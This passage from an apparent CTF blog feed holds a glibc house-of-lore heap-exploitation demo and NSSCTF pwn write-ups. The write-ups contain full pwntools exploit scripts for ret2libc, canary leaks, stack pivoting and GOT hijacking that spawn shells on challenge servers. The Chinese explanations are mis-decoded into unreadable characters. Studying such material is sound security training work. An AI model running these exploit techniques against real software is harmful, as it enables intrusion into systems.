*p2 = <span class="built_in">malloc</span>(<span class="number">1200</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The chunk that can't be handled by the unsorted bin, nor the SmallBin has been allocated to %p\n"</span>, p2);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"The victim chunk has been sorted and its fwd and bk pointers updated\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;fwd: %p\n"</span>, (<span class="type">void</span> *)victim[<span class="number">0</span>]);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"victim-&gt;bk: %p\n\n"</span>, (<span class="type">void</span> *)victim[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  victim[<span class="number">1</span>] = (<span class="type">intptr_t</span>)stack_buffer_1; <span class="comment">// victim-&gt;bk is pointing to stack</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//------------------------------------</span></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now take all dummies chunk in tcache out\n"</span>);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; i++) <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now allocating a chunk with size equal to the first one freed\n"</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This should return the overwritten victim chunk and set the bin-&gt;bk to the injected victim-&gt;bk pointer\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This last malloc should trick the glibc malloc to return a chunk at the position injected in bin-&gt;bk\n"</span>);</span><br><span class="line">  <span class="type">char</span> *p4 = <span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"p4 = malloc(0x100)\n"</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nThe fwd pointer of stack_buffer_2 has changed after the last malloc to %p\n"</span>,</span><br><span class="line">         stack_buffer_2[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\np4 is %p and should be on the stack!\n"</span>, p4); <span class="comment">// this chunk will be allocated on stack</span></span><br><span class="line">  <span class="type">intptr_t</span> sc = (<span class="type">intptr_t</span>)jackpot; <span class="comment">// Emulating our in-memory shellcode</span></span><br><span class="line"></span><br><span class="line">  <span class="type">long</span> offset = (<span class="type">long</span>)__builtin_frame_address(<span class="number">0</span>) - (<span class="type">long</span>)p4;</span><br><span class="line">  <span class="built_in">memcpy</span>((p4+offset+<span class="number">8</span>), &amp;sc, <span class="number">8</span>); <span class="comment">// This bypasses stack-smash detection since it jumps over the canary</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// sanity check</span></span><br><span class="line">  assert((<span class="type">long</span>)__builtin_return_address(<span class="number">0</span>) == (<span class="type">long</span>)jackpot);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><ol><li><strong>Small Bin Corruption Check (small bin å—æŸæ£€æŸ¥)</strong>:</li></ol><ul><li><code>glibc</code> å†…å­˜åˆ†é…å™¨åœ¨ç®¡ç† small bin æ—¶ï¼Œä¼šæ£€æŸ¥å †å—çš„ <code>fwd</code> å’Œ <code>bk</code> æŒ‡é’ˆï¼Œä»¥ç¡®ä¿å®ƒä»¬æŒ‡å‘æ­£ç¡®çš„ä½ç½®ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢å †å—é“¾è¡¨è¢«ç ´åï¼Œä»è€Œå¯¼è‡´æ½œåœ¨çš„å†…å­˜æŸåæˆ–å®‰å…¨æ¼æ´ã€‚</li><li>å½“å†…å­˜åˆ†é…å™¨ä» small bin ä¸­åˆ†é…æˆ–é‡Šæ”¾å†…å­˜å—æ—¶ï¼Œå®ƒä¼šæ£€æŸ¥æ¯ä¸ªå †å—çš„ <code>fwd</code>ï¼ˆå‰å‘ï¼‰å’Œ <code>bk</code>ï¼ˆåå‘ï¼‰æŒ‡é’ˆã€‚è¿™äº›æŒ‡é’ˆç”¨äºç»´æŠ¤å †å—é“¾è¡¨ï¼Œç¡®ä¿å †å—èƒ½å¤Ÿæ­£ç¡®æ’å…¥å’Œç§»é™¤ã€‚</li><li>å¦‚æœé“¾è¡¨ä¸­å­˜åœ¨ä¸ä¸€è‡´ï¼ˆä¾‹å¦‚æŒ‡é’ˆæŒ‡å‘é”™è¯¯çš„å†…å­˜ä½ç½®ï¼‰ï¼Œå†…å­˜åˆ†é…å™¨ä¼šæ£€æµ‹åˆ°å¹¶è§¦å‘ä¸€ä¸ªé”™è¯¯ï¼Œé˜²æ­¢æ¶æ„åˆ©ç”¨ã€‚</li></ul><ol start="2"><li><strong>Smallbin-to-Tcache Mechanism (small bin è½¬æ¢ä¸º tcache æœºåˆ¶)</strong>:</li></ol><ul><li><code>glibc</code> å¼•å…¥äº† tcacheï¼ˆthread cacheï¼‰æœºåˆ¶ï¼Œä»¥åŠ é€Ÿå°å—å†…å­˜çš„åˆ†é…å’Œé‡Šæ”¾ã€‚tcache é€šè¿‡ç»´æŠ¤æ¯ä¸ªçº¿ç¨‹çš„ç§æœ‰ç¼“å­˜ï¼Œå‡å°‘äº†å…¨å±€é”äº‰ç”¨ã€‚ç„¶è€Œï¼Œsmall bin å’Œ tcache ä¹‹é—´çš„è½¬æ¢ä¼šè¿›è¡Œé¢å¤–çš„æ£€æŸ¥ï¼Œä»¥ç¡®ä¿å †å—é“¾è¡¨çš„å®Œæ•´æ€§å’Œä¸€è‡´æ€§ã€‚</li><li>å½“å†…å­˜å—ä» small bin è½¬ç§»åˆ° tcache æ—¶ï¼Œå†…å­˜åˆ†é…å™¨ä¼šè¿›è¡Œæ£€æŸ¥ï¼Œä»¥ç¡®ä¿è½¬ç§»è¿‡ç¨‹ä¸­çš„å †å—é“¾è¡¨æ²¡æœ‰æŸåã€‚è¿™åŒ…æ‹¬æ£€æŸ¥ <code>fwd</code> å’Œ <code>bk</code> æŒ‡é’ˆçš„æœ‰æ•ˆæ€§ï¼Œä»¥åŠç¡®ä¿é“¾è¡¨çš„å®Œæ•´æ€§ã€‚</li><li>è¿™äº›æ£€æŸ¥å¯ä»¥é˜²æ­¢æ”»å‡»è€…é€šè¿‡ä¼ªé€ å †å—é“¾è¡¨æ¥æ“çºµå†…å­˜åˆ†é…è¿‡ç¨‹ã€‚</li></ul><p>é¦–å…ˆç”³è¯·ä¸€ä¸ªsmallbinçš„èŒƒå›´å†…çš„chunk-victim_chunkï¼Œå†åœ¨æ ˆä¸Šæ„é€ ä¸¤ä¸ªfake_chunkå’Œä¸€ä¸ªfreelistä»¥ç»•è¿‡ä¸Šé¢çš„ä¿æŠ¤æœºåˆ¶<br><img src="/2024/07/15/heap-study/house_of_lore_1.png" style="zoom:80%;"><br>éšåæ„é€ stack_buffer_1å’Œstack_buffer_2çš„fdå’ŒbkæŒ‡é’ˆ<br><img src="/2024/07/15/heap-study/house_of_lore_2.png"><br>æ­¤æ—¶å†mallocä¸€ä¸ªchunkä»¥é˜²æ­¢victim_chunkä¸top_chunkåˆå¹¶  </p><p>éšåå†mallocä¸€ä¸ªlarge_chunkè§¦å‘malloc_consolidateç„¶åglibcä¼šå°†victim_chunkç”±unstoredbinæ”¾å…¥smallbinä¸­<br>å†å°†victim_chunkçš„fdæŒ‡é’ˆæ”¹ä¸ºstack_buffer_1<br>æ­¤æ—¶mallocä¸€æ¬¡å°†ä¼šmallocåˆ°victim_chunkï¼Œå†mallocä¸€æ¬¡å°±ä¼šmallocåˆ°stack_buffer_1ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NSSCTF_0714_wp</title>
      <link href="/2024/07/14/NSSCTF-0714-wp/"/>
      <url>/2024/07/14/NSSCTF-0714-wp/</url>
      
        <content type="html"><![CDATA[<p>NSSCTF_0714_wp<span id="more"></span></p><h1 id="CISCN-2019åä¸­-PWN1"><a href="#CISCN-2019åä¸­-PWN1" class="headerlink" title="[CISCN 2019åä¸­]PWN1"></a>[CISCN 2019åä¸­]PWN1</h1><p>checksec<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn4_1.png"><br>64ä½ï¼Œå¼€å¯äº†NX</p><p>ä¸¢åˆ°idaé‡Œ<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn4_2.png"><br>encryptå‡½æ•°é‡Œæœ‰ä¸€ä¸ªgets()å‡½æ•°ï¼Œå­˜åœ¨æ ˆæº¢å‡ºï¼Œret2libc</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node5.anna.nssctf.cn'</span>,<span class="number">27835</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn4')</span></span><br><span class="line">elf = ELF(<span class="string">'./pwn4'</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400c83</span></span><br><span class="line">ret = <span class="number">0x00000000004006b9</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">main_addr = elf.symbols[<span class="string">'main'</span>]</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'Welcome to this Encryption machine\n'</span>, <span class="string">b'1'</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'puts_addr: '</span>, <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'Welcome to this Encryption machine\n'</span>, <span class="string">b'1'</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x50</span> + <span class="number">0x08</span>) + p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)</span><br><span class="line"></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="BJDCTF-2020-babyrop2"><a href="#BJDCTF-2020-babyrop2" class="headerlink" title="[BJDCTF 2020]babyrop2"></a>[BJDCTF 2020]babyrop2</h1><p>checksec<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn5_1.png"><br>64ä½ï¼Œå¼€å¯äº†canaryå’ŒNX</p><p>ä¸¢è¿›idaé‡Œ<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn5_2.png"><br>æ­¤å¤„åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²è·å–canary<br><img src="/2024/07/14/NSSCTF-0714-wp/pwn5_3.png"><br>æ­¤å¤„å­˜åœ¨æ ˆæº¢å‡ºæ³„éœ²å‡ºlicï¼Œret2libc</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node4.anna.nssctf.cn'</span>, <span class="number">28020</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn5')</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(<span class="string">b'%7$p'</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'0x'</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b'00'</span>), <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(canary)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./pwn5'</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">'puts'</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">'puts'</span>]</span><br><span class="line">vuln_addr = elf.symbols[<span class="string">'vuln'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000400993</span></span><br><span class="line">ret = <span class="number">0x00000000004005f9</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(<span class="number">0x20</span> - <span class="number">0x08</span>) + p64(canary) * <span class="number">2</span> + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b'\x7f'</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">io.recv()</span><br><span class="line">libc = LibcSearcher(<span class="string">'puts'</span>, puts_addr)</span><br><span class="line">libc_base = puts_addr - libc.dump(<span class="string">'puts'</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">'system'</span>)</span><br><span class="line">bin_sh_addr = libc_base + libc.dump(<span class="string">'str_bin_sh'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = cyclic(<span class="number">0x20</span> - <span class="number">0x08</span>) + p64(canary) * <span class="number">2</span> + p64(ret) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p><img src="/2024/07/14/NSSCTF-0714-wp/pwn5_4.png"><br>æ‰“é€šï¼</p>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nssctf</title>
      <link href="/2024/07/10/nssctf/"/>
      <url>/2024/07/10/nssctf/</url>
      
        <content type="html"><![CDATA[<p>ä¸€äº›wp<span id="more"></span></p><h1 id="stacksmash"><a href="#stacksmash" class="headerlink" title="stacksmash"></a>stacksmash</h1><p>checksec<br><img src="/2024/07/10/nssctf/easyecho_1.png"><br>64ä½ï¼Œä¿æŠ¤å…¨å¼€</p><p>ä¸¢åˆ°idaé‡Œ<br>å‘ç°sub_CF0å‡½æ•°æŠŠflagå†™åˆ°bssæ®µä¸Š<br><img src="/2024/07/10/nssctf/easyecho_2.png"><br><img src="/2024/07/10/nssctf/easyecho_3.png"><br>çœ‹åˆ°å­˜åœ¨æ˜æ˜¾çš„æ ˆæº¢å‡ºï¼Œé‡‡ç”¨stacksmashï¼Œå½“è¾“å…¥backdooræ—¶å°±è°ƒç”¨CF0å‡½æ•°</p><p>åŠ¨è°ƒä¸€ä¸‹ï¼Œå¾—åˆ°argv[0]çš„è·ç¦»<br><img src="/2024/07/10/nssctf/easyecho_4.png" style="zoom: 67%;"><br>çœ‹åˆ°è·ç¦»ä¸º0x198ä½†æ˜¯æ­¤å¤„çš„è·ç¦»ä¸å¯¹ï¼Œæ­£ç¡®çš„æ˜¯0x168(å…·ä½“åŸå› ä¸æ¸…æ¥šï¼Œå¯èƒ½ç”±äºç½‘ç«™ç»™çš„é™„ä»¶çš„é—®é¢˜)</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node4.anna.nssctf.cn'</span>, <span class="number">28260</span>)</span><br><span class="line"><span class="comment">#io = process('./easyecho')</span></span><br><span class="line">elf = ELF(<span class="string">'./easyecho'</span>)</span><br><span class="line"></span><br><span class="line">payload1 = <span class="string">b'a'</span> * <span class="number">0xf</span> + <span class="string">b'b'</span></span><br><span class="line">io.sendafter(<span class="string">b'Name:'</span>, payload1)</span><br><span class="line">io.recvuntil(<span class="string">b'b'</span>)</span><br><span class="line">addr_base = u64(io.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b'\x00'</span>)) - <span class="number">0xcf0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">'addr_base:'</span>, <span class="built_in">hex</span>(addr_base))</span><br><span class="line">bss_addr = addr_base + <span class="number">0x202040</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, <span class="string">b'backdoor\x00'</span>)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">b'a'</span> * <span class="number">0x168</span> + p64(bss_addr)</span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, payload2)</span><br><span class="line">io.sendlineafter(<span class="string">b'Input: '</span>, <span class="string">b'exitexit'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="æ ˆè¿ç§»"><a href="#æ ˆè¿ç§»" class="headerlink" title="æ ˆè¿ç§»"></a>æ ˆè¿ç§»</h1><p>checksec<br><img src="/2024/07/10/nssctf/PWN2_1.png"><br>32ä½ï¼Œå¼€å¯äº†NX</p><p>ä¸¢åˆ°idaé‡Œ<br><img src="/2024/07/10/nssctf/PWN2_2.png"><br>å¯ä»¥çœ‹åˆ°åªæœ‰ä¸¤ä¸ªå­—é•¿çš„æº¢å‡º<br><img src="/2024/07/10/nssctf/PWN2_3.png"><br>è¿˜æœ‰ä¸€ä¸ªå‡çš„åé—¨å‡½æ•°</p><p>åˆ©ç”¨æ ˆè¿ç§»ï¼ŒåŠ¨è°ƒå¯å¾—main_ebpè·vul_ebp 0x10<br><img src="/2024/07/10/nssctf/PWN2_4.png"></p><p><img src="/2024/07/10/nssctf/PWN2_5.png">  </p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io = remote('node5.anna.nssctf.cn', 27593)</span></span><br><span class="line">io = process(<span class="string">'./PWN2'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./PWN2'</span>)</span><br><span class="line"></span><br><span class="line">call_system = <span class="number">0x08048559</span></span><br><span class="line">leave = <span class="number">0x08048562</span></span><br><span class="line">ret = <span class="number">0x080483a6</span></span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">b'a'</span> * <span class="number">0x28</span>)</span><br><span class="line">io.recvuntil(<span class="string">b'a'</span> * <span class="number">0x28</span>)</span><br><span class="line">pre_edp = u32(io.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">'pre_edp: '</span> + <span class="built_in">hex</span>(pre_edp))</span><br><span class="line">target = pre_edp - <span class="number">0x28</span> - <span class="number">0x10</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">4</span>) + p32(ret) + p32(call_system) + p32(target + <span class="number">0x10</span>) + <span class="string">b'/bin/sh\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b'a'</span>) + p32(target) + p32(leave)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="pthread-createå¤šçº¿ç¨‹ç«äº‰"><a href="#pthread-createå¤šçº¿ç¨‹ç«äº‰" class="headerlink" title="pthread_createå¤šçº¿ç¨‹ç«äº‰"></a>pthread_createå¤šçº¿ç¨‹ç«äº‰</h1><p>checksec<br><img src="/2024/07/10/nssctf/pthread_create_1.png"> </p><p>ä¸¢åˆ°idaé‡Œ<br><img src="/2024/07/10/nssctf/pthread_create_2.png"> </p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node5.anna.nssctf.cn'</span>, <span class="number">22555</span>)</span><br><span class="line"><span class="comment">#io = process('./pwn1')</span></span><br><span class="line">io.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">b'3'</span>)</span><br><span class="line">io.sendline(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">b'3'</span>)</span><br><span class="line">io.sendline(<span class="string">b'0'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">b'2'</span>)</span><br><span class="line">io.sendline(<span class="string">b'1'</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b'&gt; '</span>)</span><br><span class="line">io.sendline(<span class="string">b'1'</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><h1 id="æ ¼å¼åŒ–å­—ç¬¦ä¸²-gotåŠ«æŒ"><a href="#æ ¼å¼åŒ–å­—ç¬¦ä¸²-gotåŠ«æŒ" class="headerlink" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²-gotåŠ«æŒ"></a>æ ¼å¼åŒ–å­—ç¬¦ä¸²-gotåŠ«æŒ</h1><p>checksec<br><img src="/2024/07/10/nssctf/babyfmt_1.png"><br>32ä½ï¼Œå¼€å¯NX</p><p>ä¸¢åˆ°ida<br><img src="/2024/07/10/nssctf/babyfmt_2.png"><br>æœ‰åé—¨å‡½æ•°<br><img src="/2024/07/10/nssctf/babyfmt_3.png"><br>å¯ä»¥åˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼ŒåŠ«æŒprintfçš„gotè¡¨ä¸ºåé—¨å‡½æ•°çš„åœ°å€ï¼Œä»è€Œæ‹¿åˆ°shell</p><p>exp  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">'i386'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node5.anna.nssctf.cn'</span>, <span class="number">26146</span>)</span><br><span class="line"><span class="comment">#io = process('./babyfmt')</span></span><br><span class="line">elf = ELF(<span class="string">'./babyfmt'</span>)</span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">offset = <span class="number">11</span></span><br><span class="line">printf_got = elf.got[<span class="string">'printf'</span>]</span><br><span class="line">backdoor_addr = elf.sym[<span class="string">'backdoor'</span>]</span><br><span class="line">payload = fmtstr_payload(offset, {printf_got: backdoor_addr})</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸€ä¸ªwpå’Œlinuxæ–‡ä»¶æè¿°ç¬¦åŠé‡å®šå‘</title>
      <link href="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/"/>
      <url>/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/</url>
      
